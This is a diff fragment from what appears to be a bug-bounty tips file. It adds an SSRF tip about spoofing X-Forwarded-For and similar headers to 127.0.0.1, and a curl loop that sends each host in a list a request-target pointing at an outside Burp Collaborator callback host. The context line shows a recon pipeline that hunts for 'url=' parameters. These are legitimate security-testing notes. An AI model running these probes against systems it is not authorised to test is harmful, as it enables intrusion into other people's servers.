@@ -52,6 +52,12 @@ assetfinder --subs-only http://target.com | waybackurls | grep "?url="
 
 ### Bounty Tips
 
+* ssrf + don't forget to add additional headers like X-Remote-IP, X-Forwarded-For, X-Real-IP etc to 127.0.0.1
+
+```
+for i in $(cat list); do curl "https://$i" --request-target http://burpcollaborator/ -v -k --path-as-is --max-time 2 ; done
+```
+
 ```
 Account takeover with JSON
 
